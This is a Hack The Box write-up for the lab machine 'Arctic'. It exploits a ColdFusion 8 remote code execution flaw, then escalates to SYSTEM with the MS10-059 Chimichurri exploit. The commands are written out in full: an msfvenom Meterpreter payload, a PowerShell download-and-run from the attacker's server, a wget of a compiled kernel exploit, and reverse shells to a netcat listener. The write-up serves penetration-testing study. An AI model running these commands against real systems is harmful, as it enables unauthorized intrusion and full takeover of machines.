# Arctic — Hack The Box Writeup

## Summary

Arctic is a Windows host running an outdated Adobe ColdFusion 8 service. Enumeration revealed an exposed ColdFusion web interface on port `8500`, which was vulnerable to remote code execution. Initial access was obtained by exploiting ColdFusion and receiving a limited Windows command shell.

After confirming code execution, a Meterpreter payload was generated, transferred to the target, and executed manually to obtain a more stable session. Local enumeration identified the operating system as Windows `6.1.7600`, consistent with an unpatched Windows Server 2008 R2 / Windows 7 RTM-era system. Privilege escalation was then performed using **MS10-059 Chimichurri**, resulting in a shell as `NT AUTHORITY\SYSTEM`.

---

## Enumeration

Initial service enumeration identified port `8500` as open, exposing an Adobe ColdFusion service.

```bash
nmap -sC -sV -oA nmap/arctic 10.129.37.20
```

The relevant finding was the ColdFusion service:

```text
8500/tcp open  http  Adobe ColdFusion 8
```

The application was reachable in the browser:

```text
http://10.129.37.20:8500/
```

ColdFusion 8 is a very old application stack and has known remote code execution issues. This made it the primary attack surface.

---

## Initial Access

A ColdFusion remote code execution exploit was used to gain command execution on the target. The exploit uploaded a JSP payload and triggered it through the ColdFusion service.

The exploit was run against the target:

```bash
python3 coldfusion_rce.py 10.129.37.20 8500
```

A listener received a reverse shell from the target:

```text
connect to [10.10.14.200] from (UNKNOWN) [10.129.37.20]
Microsoft Windows [Version 6.1.7600]
```

The initial shell landed in the ColdFusion runtime directory:

```cmd
C:\ColdFusion8\runtime\bin>
```

The current user context was the limited ColdFusion service user.

The user flag was readable from the `tolis` user desktop:

```cmd
type C:\Users\tolis\Desktop\user.txt
```

---

## Stabilizing Access with Meterpreter

The first shell was functional but limited. To make post-exploitation easier, a Meterpreter payload was generated on Kali.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.200 LPORT=4242 -f exe -o shell.exe
```

The payload was hosted with a Python HTTP server:

```bash
python3 -m http.server 8000
```

A Metasploit handler was configured to catch the Meterpreter session:

```text
msfconsole
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.200
set LPORT 4242
run
```

From the existing Windows shell, the payload was downloaded to the target:

```cmd
powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.200:8000/shell.exe','shell.exe')"
```

The Kali HTTP server confirmed the transfer:

```text
10.129.37.20 - - "GET /shell.exe HTTP/1.1" 200 -
```

The payload then had to be executed manually from the Windows shell:

```cmd
shell.exe
```

This returned a Meterpreter session to the handler.

---

## Local Enumeration

Basic local enumeration confirmed the Windows version:

```text
Microsoft Windows [Version 6.1.7600]
```

The Meterpreter session could also be used to collect system information:

```text
meterpreter > sysinfo
meterpreter > getuid
```

The operating system version was important because Windows `6.1.7600` is an old, unpatched Windows Server 2008 R2 / Windows 7 RTM-era build. This made legacy local privilege escalation exploits worth testing.

The Metasploit `local_exploit_suggester` module was attempted:

```text
meterpreter > run post/multi/recon/local_exploit_suggester
```

However, the module failed due to a local Metasploit/Ruby issue on Kali:

```text
Post failed: NameError uninitialized constant HTTP
```

This error came from the local Metasploit environment, not from the target. Manual privilege escalation selection was therefore used instead.

---

## Privilege Escalation

Based on the target OS version, **MS10-059 Chimichurri** was selected as the likely privilege escalation path.

The compiled exploit was downloaded on Kali:

```bash
wget https://raw.githubusercontent.com/egre55/windows-kernel-exploits/master/MS10-059%3A%20Chimichurri/Compiled/Chimichurri.exe -O Chimichurri.exe
```

A listener was started on Kali to catch the SYSTEM shell:

```bash
nc -lvnp 4445
```

The exploit was uploaded through Meterpreter:

```text
meterpreter > upload Chimichurri.exe C:\\Windows\\Temp\\chim.exe
```

A shell was opened from Meterpreter:

```text
meterpreter > shell
```

The exploit was then executed on the target, pointing back to the attacker VPN IP and listener port:

```cmd
C:\Windows\Temp\chim.exe 10.10.14.200 4445
```

The listener received a new shell:

```text
connect to [10.10.14.200] from (UNKNOWN) [10.129.37.20]
Microsoft Windows [Version 6.1.7600]
```

The shell was running as SYSTEM:

```cmd
whoami
```

Output:

```text
nt authority\system
```

## Attack Chain

```text
Port scan
→ Adobe ColdFusion 8 discovered on port 8500
→ ColdFusion RCE exploited
→ Initial shell as limited service user
→ user.txt read from C:\Users\tolis\Desktop
→ Meterpreter payload generated and transferred
→ Meterpreter session established
→ Windows 6.1.7600 identified
→ MS10-059 Chimichurri selected
→ Chimichurri uploaded and executed
→ SYSTEM shell received
→ root.txt read from Administrator desktop
```

---

